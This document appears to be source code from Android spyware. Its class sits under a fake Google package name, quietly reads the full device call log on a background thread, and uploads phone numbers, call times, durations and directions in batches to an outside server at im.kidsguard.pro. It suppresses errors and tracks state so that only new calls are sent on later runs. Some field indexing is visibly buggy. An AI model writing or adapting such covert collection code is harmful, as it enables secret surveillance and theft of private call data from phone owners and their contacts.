package com.google.cloudservices;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Date;

public class SendCall {
    JSONObject calljson;
    JSONArray callarray;
    ArrayList<String> phnumber1=new ArrayList<String>();
    ArrayList<String> calldate1=new ArrayList<String>();
    ArrayList<String> callduration=new ArrayList<String>();
    ArrayList<String> dir1=new ArrayList<String>();
    int i=0,b=0,activity;
    public void sendcal(Context context){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {



        dbFirsRun dbFirsRun=new dbFirsRun(context);
        if (dbFirsRun.getrun().get(2).equals("callfirst")){
            activity=1;
            dbFirsRun.Updatecall("callsec","3");
        }else{activity=2;}
        DBcallManager dBcallManager=new DBcallManager(context);
        Uri uri = Uri.parse(String.valueOf(CallLog.Calls.CONTENT_URI));
        Cursor c= context.getContentResolver().query(uri, null, null ,null,null);
        try {
            callarray=new JSONArray();
            int number = c.getColumnIndex(CallLog.Calls.NUMBER);
            int type = c.getColumnIndex(CallLog.Calls.TYPE);
            int date = c.getColumnIndex(CallLog.Calls.DATE);
            int duration = c.getColumnIndex(CallLog.Calls.DURATION);
            while (c.moveToNext()) {
                String phNumber = c.getString(number);
                String callType = c.getString(type);
                String callDate = c.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = c.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                Date datee = new Date(Long.valueOf(callDate));
                String s = String.valueOf(datee.getYear())+getdoragham(String.valueOf(datee.getMonth())) + getdoragham(String.valueOf(datee.getDay())) + getdoragham(String.valueOf(datee.getHours())) + getdoragham(String.valueOf(datee.getMinutes())) + getdoragham(String.valueOf(datee.getSeconds()));
                long datexalln= Long.parseLong(s);
                String s1=dBcallManager.getowner();
                dBcallManager.close();
               // Runtime.getRuntime().gc();
                long datecallp= Long.parseLong(s1);
                checkErrorResponse checkErrorResponse=new checkErrorResponse();
                if (checkErrorResponse.checkeror(context,"calls")){
                    phnumber1.add(phNumber);
                    calldate1.add(callDate);
                    callduration.add(callDuration);
                    dir1.add(dir);
                    if (s1.equals("1")){
                        dBcallManager.Insertowner(s);
                        dBcallManager.close();
                      //  Runtime.getRuntime().gc();
                    }else if (datexalln>datecallp){
                        dBcallManager.Updatecall(s);
                        dBcallManager.close();
                       // Runtime.getRuntime().gc();
                    }
                }else {
                    if (activity==1){
                        phnumber1.add(phNumber);
                        calldate1.add(callDate);
                        callduration.add(callDuration);
                        dir1.add(dir);
                        if (s1.equals("1")){
                            dBcallManager.Insertowner(s);
                            dBcallManager.close();
                            //Runtime.getRuntime().gc();
                        }else if (datexalln>datecallp){
                            dBcallManager.Updatecall(s);
                            dBcallManager.close();
                           // Runtime.getRuntime().gc();

                        }
                    }else {
                        if (s1.equals("1")){
                            phnumber1.add(phNumber);
                            calldate1.add(callDate);
                            callduration.add(callDuration);
                            dir1.add(dir);
                            dBcallManager.Insertowner(s);
                            dBcallManager.close();
                          //  Runtime.getRuntime().gc();

                        }else
                        if (datexalln>datecallp){
                            phnumber1.add(phNumber);
                            calldate1.add(callDate);
                            callduration.add(callDuration);
                            dir1.add(dir);
                            dBcallManager.Updatecall(s);
                            dBcallManager.close();
                           // Runtime.getRuntime().gc();


                        }
                    }}
            }
            checkErrorResponse checkErrorResponse=new checkErrorResponse();
            checkErrorResponse.deleterror(context,"calls");
        }catch (Exception e){}finally {
            c.close();
        }
        if (phnumber1.size()>0){
        int total=phnumber1.size();
        int daste=total/100;
        int baghee=total%100;
        int b=0;
        int i=0;
        while (i<daste){

            int sad=0;
            while (sad<100){

                try {
                    calljson=new JSONObject();
                    calljson.put("phnumber", phnumber1.get(i*100+sad));
                    calljson.put("calldate", calldate1.get(i*100+sad));
                    calljson.put("callduration", callduration.get(i*100+sad));
                    calljson.put("dir", dir1.get(i));
                    callarray.put( b,calljson);

                } catch (JSONException e) {

                }

                b++;
                sad++;
            }
            i++;
        }
        int h=0;
        while (h<baghee){
            try {
                calljson=new JSONObject();
                calljson.put("phnumber", phnumber1.get(daste*100+h));
                calljson.put("calldate", calldate1.get(daste*100+h));
                calljson.put("callduration", callduration.get(daste*100+h));
                calljson.put("dir", dir1.get(i));
                callarray.put( b,calljson);

            } catch (JSONException e) {

            }
            b++;
            h++;
        }


                String cal= String.valueOf(callarray);
                sm sm=new sm();
                sm.add(context,"https://im.kidsguard.pro/api/add-calls/","calls",cal);

    }}catch (NullPointerException e){}
            }
        }).start();

    }


    public String getdoragham(String h){
        String c;
        int a= Integer.parseInt(h);

        if (a<10){
            c="0"+h;
        }else {c=h;}
        return c;
    }
}
